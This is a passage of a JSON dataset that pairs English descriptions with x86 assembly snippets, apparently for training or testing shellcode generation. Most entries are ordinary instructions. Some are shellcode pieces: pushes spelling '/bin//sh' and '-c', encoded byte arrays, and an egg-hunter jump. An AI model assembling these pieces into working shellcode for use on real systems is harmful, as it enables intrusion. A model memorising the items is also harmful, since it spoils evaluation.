  {
    "intent": "push the word 0x6d6f onto the stack",
    "rewritten_intent": "push the word 0x6d6f onto the stack",
    "snippet": "push word 0x6d6f",
    "slot_map": {
      "0x6d6f": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x6f64 to the stack",
    "rewritten_intent": "push the word 0x6f64 to the stack",
    "snippet": "push word 0x6f64",
    "slot_map": {
      "0x6f64": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x6f64 onto the stack",
    "rewritten_intent": "push the word 0x6f64 onto the stack",
    "snippet": "push word 0x6f64",
    "slot_map": {
      "0x6f64": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x7065 onto the stack",
    "rewritten_intent": "push the word 0x7065 onto the stack",
    "snippet": "push word 0x7065",
    "slot_map": {
      "0x7065": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x722d onto the stack",
    "rewritten_intent": "push the word 0x722d onto the stack",
    "snippet": "push word 0x722d",
    "slot_map": {
      "0x722d": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x7365 onto the stack",
    "rewritten_intent": "push the word 0x7365 onto the stack",
    "snippet": "push word 0x7365",
    "slot_map": {
      "0x7365": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x736e onto the stack",
    "rewritten_intent": "push the word 0x736e onto the stack",
    "snippet": "push word 0x736e",
    "slot_map": {
      "0x736e": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x776f onto the stack",
    "rewritten_intent": "push the word 0x776f onto the stack",
    "snippet": "push word 0x776f",
    "slot_map": {
      "0x776f": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x7773 to the stack",
    "rewritten_intent": "push the word 0x7773 to the stack",
    "snippet": "push word 0x7773",
    "slot_map": {
      "0x7773": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x7773 onto the stack",
    "rewritten_intent": "push the word 0x7773 onto the stack",
    "snippet": "push word 0x7773",
    "slot_map": {
      "0x7773": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x8223 onto the stack",
    "rewritten_intent": "push the word 0x8223 onto the stack",
    "snippet": "push word 0x8223",
    "slot_map": {
      "0x8223": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0xaaaa onto the stack",
    "rewritten_intent": "push the word 0xaaaa onto the stack",
    "snippet": "push word 0xaaaa",
    "slot_map": {
      "0xaaaa": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0xb315 onto the stack",
    "rewritten_intent": "push the word 0xb315 onto the stack",
    "snippet": "push word 0xb315",
    "slot_map": {
      "0xb315": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0xc005 onto the stack",
    "rewritten_intent": "push the word 0xc005 onto the stack",
    "snippet": "push word 0xc005",
    "slot_map": {
      "0xc005": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0xc005 to the stack",
    "rewritten_intent": "push the word 0xc005 to the stack",
    "snippet": "push word 0xc005",
    "slot_map": {
      "0xc005": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0xffff onto the stack",
    "rewritten_intent": "push the word 0xffff onto the stack",
    "snippet": "push word 0xffff",
    "slot_map": {
      "0xffff": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0xffff to the stack",
    "rewritten_intent": "push the word 0xffff to the stack",
    "snippet": "push word 0xffff",
    "slot_map": {
      "0xffff": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 1 onto the stack and point eax to the stack register",
    "rewritten_intent": "push the word 1 onto the stack and point eax to the stack register",
    "snippet": "push word 1 \\n mov eax, esp",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "1",
      "stack",
      "and",
      "point",
      "var0",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "1",
      "\\n",
      "mov",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the word 10 to the stack",
    "rewritten_intent": "push the word 10 to the stack",
    "snippet": "push word 10",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "word",
      "10",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "10"
    ]
  },
  {
    "intent": "push the word 100 onto the stack",
    "rewritten_intent": "push the word 100 onto the stack",
    "snippet": "push word 100",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "word",
      "100",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "100"
    ]
  },
  {
    "intent": "push the word 17 onto the stack and point edx to the stack register",
    "rewritten_intent": "push the word 17 onto the stack and point edx to the stack register",
    "snippet": "push word 17 \\n mov edx, esp",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "17",
      "stack",
      "and",
      "point",
      "var0",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "17",
      "\\n",
      "mov",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push 2 onto stack",
    "rewritten_intent": "push 2 onto stack",
    "snippet": "push word 2",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "2",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "2"
    ]
  },
  {
    "intent": "push the word 2 onto the stack",
    "rewritten_intent": "push the word 2 onto the stack",
    "snippet": "push word 2",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "word",
      "2",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "2"
    ]
  },
  {
    "intent": "push the word 2 onto the stack and point ecx to the stack register",
    "rewritten_intent": "push the word 2 onto the stack and point ecx to the stack register",
    "snippet": "push word 2 \\n mov ecx, esp",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "2",
      "stack",
      "and",
      "point",
      "var0",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "2",
      "\\n",
      "mov",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the word 21 onto the stack and point ebx to the stack register",
    "rewritten_intent": "push the word 21 onto the stack and point ebx to the stack register",
    "snippet": "push word 21 \\n mov ebx, esp",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "21",
      "stack",
      "and",
      "point",
      "var0",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "21",
      "\\n",
      "mov",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the word ax onto the stack",
    "rewritten_intent": "push the word ax onto the stack",
    "snippet": "push word ax",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "word",
      "ax",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "ax"
    ]
  },
  {
    "intent": "push the word bx onto the stack",
    "rewritten_intent": "push the word bx onto the stack",
    "snippet": "push word bx",
    "slot_map": {
      "bx": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word bx to the stack",
    "rewritten_intent": "push the word bx to the stack",
    "snippet": "push word bx",
    "slot_map": {
      "bx": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word cx onto the stack",
    "rewritten_intent": "push the word cx onto the stack",
    "snippet": "push word cx",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "word",
      "cx",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "cx"
    ]
  },
  {
    "intent": "push the zero_reg onto the stack",
    "rewritten_intent": "push the zero_reg onto the stack",
    "snippet": "push zero_reg",
    "slot_map": {
      "zero_reg": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push zero_reg onto the stack",
    "rewritten_intent": "push zero_reg onto the stack",
    "snippet": "push zero_reg",
    "slot_map": {
      "zero_reg": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "declare push_cmd label",
    "rewritten_intent": "declare push_cmd label",
    "snippet": "push_cmd:",
    "slot_map": {
      "push_cmd": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "declare the push_cmd label",
    "rewritten_intent": "declare the push_cmd label",
    "snippet": "push_cmd:",
    "slot_map": {
      "push_cmd": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "push $0x68732f2f onto the stack",
    "rewritten_intent": "push $0x68732f2f onto the stack",
    "snippet": "pushl $0x68732f2f",
    "slot_map": {
      "0x68732f2f": "var1",
      "$0x68732f2f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "pushl",
      "var0"
    ]
  },
  {
    "intent": "push $0x6e69622f onto the stack",
    "rewritten_intent": "push $0x6e69622f onto the stack",
    "snippet": "pushl $0x6e69622f",
    "slot_map": {
      "0x6e69622f": "var1",
      "$0x6e69622f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "pushl",
      "var0"
    ]
  },
  {
    "intent": "push $0x632d onto the stack",
    "rewritten_intent": "push $0x632d onto the stack",
    "snippet": "pushw $0x632d",
    "slot_map": {
      "0x632d": "var1",
      "$0x632d": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "pushw",
      "var0"
    ]
  },
  {
    "intent": "push the 0x3905 onto the stack",
    "rewritten_intent": "push the 0x3905 onto the stack",
    "snippet": "pushw 0x3905",
    "slot_map": {
      "0x3905": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "pushw",
      "var0"
    ]
  },
  {
    "intent": "push the 0x682d onto the stack",
    "rewritten_intent": "push the 0x682d onto the stack",
    "snippet": "pushw 0x682d",
    "slot_map": {
      "0x682d": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "pushw",
      "var0"
    ]
  },
  {
    "intent": "push the 0x697a onto the stack",
    "rewritten_intent": "push the 0x697a onto the stack",
    "snippet": "pushw 0x697a",
    "slot_map": {
      "0x697a": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "pushw",
      "var0"
    ]
  },
  {
    "intent": "in the routine R1 point to the next byte in esi",
    "rewritten_intent": "in the routine R1 point to the next byte in esi",
    "snippet": "R1: \\n inc esi",
    "slot_map": {
      "R1": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "in",
      "routine",
      "var0",
      "point",
      "next",
      "byte",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "inc",
      "var1"
    ]
  },
  {
    "intent": "in the routine R1 point to the next word in esi",
    "rewritten_intent": "in the routine R1 point to the next word in esi",
    "snippet": "R1: \\n inc esi \\n inc esi",
    "slot_map": {
      "R1": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "in",
      "routine",
      "var0",
      "point",
      "next",
      "word",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "inc",
      "var1",
      "\\n",
      "inc",
      "var1"
    ]
  },
  {
    "intent": "in the routine R1 save the shellcode in esi",
    "rewritten_intent": "in the routine R1 save the shellcode in esi",
    "snippet": "R1: \\n pop esi",
    "slot_map": {
      "R1": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "in",
      "routine",
      "var0",
      "save",
      "shellcode",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "pop",
      "var1"
    ]
  },
  {
    "intent": "declare R2 and point to the next byte in esi",
    "rewritten_intent": "declare R2 and point to the next byte in esi",
    "snippet": "R2: \\n inc esi",
    "slot_map": {
      "R2": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "and",
      "point",
      "next",
      "byte",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "inc",
      "var1"
    ]
  },
  {
    "intent": "declare R2 and point to the next word in esi",
    "rewritten_intent": "declare R2 and point to the next word in esi",
    "snippet": "R2: \\n inc esi \\n inc esi",
    "slot_map": {
      "R2": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "and",
      "point",
      "next",
      "word",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "inc",
      "var1",
      "\\n",
      "inc",
      "var1"
    ]
  },
  {
    "intent": "define label re",
    "rewritten_intent": "define label re",
    "snippet": "re",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "label",
      "re"
    ],
    "snippet_tokens": [
      "re"
    ]
  },
  {
    "intent": "declare the read label",
    "rewritten_intent": "declare the read label",
    "snippet": "read:",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "read",
      "label"
    ],
    "snippet_tokens": [
      "read",
      ":"
    ]
  },
  {
    "intent": "declare the reading label",
    "rewritten_intent": "declare the reading label",
    "snippet": "reading:",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "reading",
      "label"
    ],
    "snippet_tokens": [
      "reading",
      ":"
    ]
  },
  {
    "intent": "define the doubleword variable real_number1 and initialize to 1234",
    "rewritten_intent": "define the doubleword variable real_number1 and initialize to 1234",
    "snippet": "real_number1 dd 1234",
    "slot_map": {
      "real_number1": "var0"
    },
    "intent_tokens": [
      "define",
      "doubleword",
      "variable",
      "var0",
      "and",
      "initialize",
      "1234"
    ],
    "snippet_tokens": [
      "var0",
      "dd",
      "1234"
    ]
  },
  {
    "intent": "define the doubleword variable real_number2 and initialize 123456",
    "rewritten_intent": "define the doubleword variable real_number2 and initialize 123456",
    "snippet": "real_number2 dd 123456",
    "slot_map": {
      "real_number2": "var0"
    },
    "intent_tokens": [
      "define",
      "doubleword",
      "variable",
      "var0",
      "and",
      "initialize",
      "123456"
    ],
    "snippet_tokens": [
      "var0",
      "dd",
      "123456"
    ]
  },
  {
    "intent": "reserve an array of ten reals for realarray",
    "rewritten_intent": "reserve an array of ten reals for realarray",
    "snippet": "realarray resq 10",
    "slot_map": {
      "for": "var0",
      "realarray": "var1"
    },
    "intent_tokens": [
      "reserve",
      "array",
      "ten",
      "reals",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "resq",
      "10"
    ]
  },
  {
    "intent": "reserve array realarray of 10 real numbers",
    "rewritten_intent": "reserve array realarray of 10 real numbers",
    "snippet": "realarray resq 10",
    "slot_map": {
      "realarray": "var0"
    },
    "intent_tokens": [
      "reserve",
      "array",
      "var0",
      "10",
      "real",
      "numbers"
    ],
    "snippet_tokens": [
      "var0",
      "resq",
      "10"
    ]
  },
  {
    "intent": "return",
    "rewritten_intent": "return",
    "snippet": "ret",
    "slot_map": {},
    "intent_tokens": [
      "return"
    ],
    "snippet_tokens": [
      "ret"
    ]
  },
  {
    "intent": "return the address off the stack and returns control to that location",
    "rewritten_intent": "return the address off the stack and returns control to that location",
    "snippet": "ret",
    "slot_map": {
      "that": "var0"
    },
    "intent_tokens": [
      "return",
      "address",
      "off",
      "stack",
      "and",
      "returns",
      "control",
      "var0",
      "location"
    ],
    "snippet_tokens": [
      "ret"
    ]
  },
  {
    "intent": "return to our program",
    "rewritten_intent": "return to our program",
    "snippet": "ret",
    "slot_map": {},
    "intent_tokens": [
      "return",
      "our",
      "program"
    ],
    "snippet_tokens": [
      "ret"
    ]
  },
  {
    "intent": "return to the address on the top of the stack",
    "rewritten_intent": "return to the address on the top of the stack",
    "snippet": "ret",
    "slot_map": {},
    "intent_tokens": [
      "return",
      "address",
      "top",
      "stack"
    ],
    "snippet_tokens": [
      "ret"
    ]
  },
  {
    "intent": "return to where the function was called",
    "rewritten_intent": "return to where the function was called",
    "snippet": "ret",
    "slot_map": {
      "where": "var0"
    },
    "intent_tokens": [
      "return",
      "var0",
      "function",
      "was",
      "called"
    ],
    "snippet_tokens": [
      "ret"
    ]
  },
  {
    "intent": "return to caller",
    "rewritten_intent": "return to caller",
    "snippet": "ret",
    "slot_map": {},
    "intent_tokens": [
      "return",
      "caller"
    ],
    "snippet_tokens": [
      "ret"
    ]
  },
  {
    "intent": "left rotate the byte at the address esi by 0x2 bits",
    "rewritten_intent": "left rotate the byte at the address esi by 0x2 bits",
    "snippet": "rol byte [esi], 0x2",
    "slot_map": {
      "0x2": "var1",
      "esi": "var0"
    },
    "intent_tokens": [
      "left",
      "rotate",
      "byte",
      "address",
      "var0",
      "var1",
      "bits"
    ],
    "snippet_tokens": [
      "rol",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "var1"
    ]
  },
  {
    "intent": "left rotate the byte in esi 2 times",
    "rewritten_intent": "left rotate the byte in esi 2 times",
    "snippet": "rol byte [esi], 0x2",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "left",
      "rotate",
      "byte",
      "var0",
      "2",
      "times"
    ],
    "snippet_tokens": [
      "rol",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "0x2"
    ]
  },
  {
    "intent": "rotate 4 bits left the byte starting at the address esi",
    "rewritten_intent": "rotate 4 bits left the byte starting at the address esi",
    "snippet": "rol byte [esi], 4",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "rotate",
      "4",
      "bits",
      "left",
      "byte",
      "starting",
      "address",
      "var0"
    ],
    "snippet_tokens": [
      "rol",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "4"
    ]
  },
  {
    "intent": "left rotate the contents of the edi register by 1 bit",
    "rewritten_intent": "left rotate the contents of the edi register by 1 bit",
    "snippet": "rol edi, 1",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "left",
      "rotate",
      "contents",
      "var0",
      "register",
      "1",
      "bit"
    ],
    "snippet_tokens": [
      "rol",
      "var0",
      ",",
      "1"
    ]
  },
  {
    "intent": "left rotate the edi register 1 time",
    "rewritten_intent": "left rotate the edi register 1 time",
    "snippet": "rol edi, 1",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "left",
      "rotate",
      "var0",
      "register",
      "1",
      "time"
    ],
    "snippet_tokens": [
      "rol",
      "var0",
      ",",
      "1"
    ]
  },
  {
    "intent": "left rotate the contents of the edx register by 0x4 bits",
    "rewritten_intent": "left rotate the contents of the edx register by 0x4 bits",
    "snippet": "rol edx, 0x4",
    "slot_map": {
      "0x4": "var1",
      "edx": "var0"
    },
    "intent_tokens": [
      "left",
      "rotate",
      "contents",
      "var0",
      "register",
      "var1",
      "bits"
    ],
    "snippet_tokens": [
      "rol",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "right rotate the contents of the esi register by 1 bit",
    "rewritten_intent": "right rotate the contents of the esi register by 1 bit",
    "snippet": "ror esi, 1",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "right",
      "rotate",
      "contents",
      "var0",
      "register",
      "1",
      "bit"
    ],
    "snippet_tokens": [
      "ror",
      "var0",
      ",",
      "1"
    ]
  },
  {
    "intent": "declare the rotate label",
    "rewritten_intent": "declare the rotate label",
    "snippet": "rotate:",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "rotate",
      "label"
    ],
    "snippet_tokens": [
      "rotate",
      ":"
    ]
  },
  {
    "intent": "S1 is an array of bytes 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73",
    "rewritten_intent": "S1 is an array of bytes 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73",
    "snippet": "S1: db 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73, 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80",
    "slot_map": {
      "0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73": "var1",
      "S1": "var0"
    },
    "intent_tokens": [
      "var0",
      "array",
      "bytes",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "db",
      "var1",
      ",",
      "0x2f",
      ",",
      "0x68",
      ",",
      "0x69",
      ",",
      "0x62",
      ",",
      "0x87",
      ",",
      "0x6e",
      ",",
      "0xb0",
      ",",
      "0xe3",
      ",",
      "0xcd",
      ",",
      "0x0b",
      ",",
      "0x90",
      ",",
      "0x80"
    ]
  },
  {
    "intent": "define S2 as the array of bytes 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80",
    "rewritten_intent": "define S2 as the array of bytes 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80",
    "snippet": "S2: db 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80",
    "slot_map": {
      "S2": "var0",
      "0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80": "var1",
      "0x2f": "var2",
      "0x68": "var3",
      "0x69": "var4",
      "0x62": "var5",
      "0x87": "var6",
      "0x6e": "var7",
      "0xcd": "var8",
      "0x90": "var9",
      "0x80": "var10"
    },
    "intent_tokens": [
      "define",
      "var0",
      "array",
      "bytes",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "db",
      "var1"
    ]
  },
  {
    "intent": "S3 is an array of words 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73",
    "rewritten_intent": "S3 is an array of words 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73",
    "snippet": "S3: dw 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73, 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80",
    "slot_map": {
      "0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73": "var1",
      "S3": "var0"
    },
    "intent_tokens": [
      "var0",
      "array",
      "words",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "dw",
      "var1",
      ",",
      "0x2f",
      ",",
      "0x68",
      ",",
      "0x69",
      ",",
      "0x62",
      ",",
      "0x87",
      ",",
      "0x6e",
      ",",
      "0xb0",
      ",",
      "0xe3",
      ",",
      "0xcd",
      ",",
      "0x0b",
      ",",
      "0x90",
      ",",
      "0x80"
    ]
  },
  {
    "intent": "define S4 as the array of words 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80",
    "rewritten_intent": "define S4 as the array of words 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80",
    "snippet": "S4: db 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80",
    "slot_map": {
      "S4": "var0",
      "0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80": "var1",
      "0x2f": "var2",
      "0x68": "var3",
      "0x69": "var4",
      "0x62": "var5",
      "0x87": "var6",
      "0x6e": "var7",
      "0xcd": "var8",
      "0x90": "var9",
      "0x80": "var10"
    },
    "intent_tokens": [
      "define",
      "var0",
      "array",
      "words",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "db",
      "var1"
    ]
  },
  {
    "intent": "right shift the contents of eax by 23 bits",
    "rewritten_intent": "right shift the contents of eax by 23 bits",
    "snippet": "sar eax, 23",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "right",
      "shift",
      "contents",
      "var0",
      "23",
      "bits"
    ],
    "snippet_tokens": [
      "sar",
      "var0",
      ",",
      "23"
    ]
  },
  {
    "intent": "right shift the contents of eax by 31 bits",
    "rewritten_intent": "right shift the contents of eax by 31 bits",
    "snippet": "sar eax, 31",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "right",
      "shift",
      "contents",
      "var0",
      "31",
      "bits"
    ],
    "snippet_tokens": [
      "sar",
      "var0",
      ",",
      "31"
    ]
  },
  {
    "intent": "right shift the contents of ebx by 31 bits",
    "rewritten_intent": "right shift the contents of ebx by 31 bits",
    "snippet": "sar ebx, 31",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "right",
      "shift",
      "contents",
      "var0",
      "31",
      "bits"
    ],
    "snippet_tokens": [
      "sar",
      "var0",
      ",",
      "31"
    ]
  },
  {
    "intent": "right shift the value of register ecx by 2 bits",
    "rewritten_intent": "right shift the value of register ecx by 2 bits",
    "snippet": "sar ecx, 2",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "right",
      "shift",
      "value",
      "register",
      "var0",
      "2",
      "bits"
    ],
    "snippet_tokens": [
      "sar",
      "var0",
      ",",
      "2"
    ]
  },
  {
    "intent": "right shift the value of register edx by 4 bits",
    "rewritten_intent": "right shift the value of register edx by 4 bits",
    "snippet": "sar edx, 4",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "right",
      "shift",
      "value",
      "register",
      "var0",
      "4",
      "bits"
    ],
    "snippet_tokens": [
      "sar",
      "var0",
      ",",
      "4"
    ]
  },
  {
    "intent": "compare eax with doubleword at edi and set status flags",
    "rewritten_intent": "compare eax with doubleword at edi and set status flags",
    "snippet": "scasd",
    "slot_map": {
      "eax": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "compare",
      "var0",
      "doubleword",
      "var1",
      "and",
      "set",
      "status",
      "flags"
    ],
    "snippet_tokens": [
      "scasd"
    ]
  },
  {
    "intent": "compare the contents of the eax register with doubleword at edi and set status flags",
    "rewritten_intent": "compare the contents of the eax register with doubleword at edi and set status flags",
    "snippet": "scasd",
    "slot_map": {
      "eax": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "compare",
      "contents",
      "var0",
      "register",
      "doubleword",
      "var1",
      "and",
      "set",
      "status",
      "flags"
    ],
    "snippet_tokens": [
      "scasd"
    ]
  },
  {
    "intent": "compare the value in eax to the doubleword addressed by edi",
    "rewritten_intent": "compare the value in eax to the doubleword addressed by edi",
    "snippet": "scasd",
    "slot_map": {
      "eax": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "compare",
      "value",
      "var0",
      "doubleword",
      "addressed",
      "var1"
    ],
    "snippet_tokens": [
      "scasd"
    ]
  },
  {
    "intent": "compare the value in the eax register to the doubleword addressed by the edi register",
    "rewritten_intent": "compare the value in the eax register to the doubleword addressed by the edi register",
    "snippet": "scasd",
    "slot_map": {
      "eax": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "compare",
      "value",
      "var0",
      "register",
      "doubleword",
      "addressed",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "scasd"
    ]
  },
  {
    "intent": "jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register",
    "rewritten_intent": "jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register",
    "snippet": "scasd \\ jnz _end \\n jmp edi",
    "slot_map": {
      "_end": "var0",
      "eax": "var1",
      "edi": "var2"
    },
    "intent_tokens": [
      "jump",
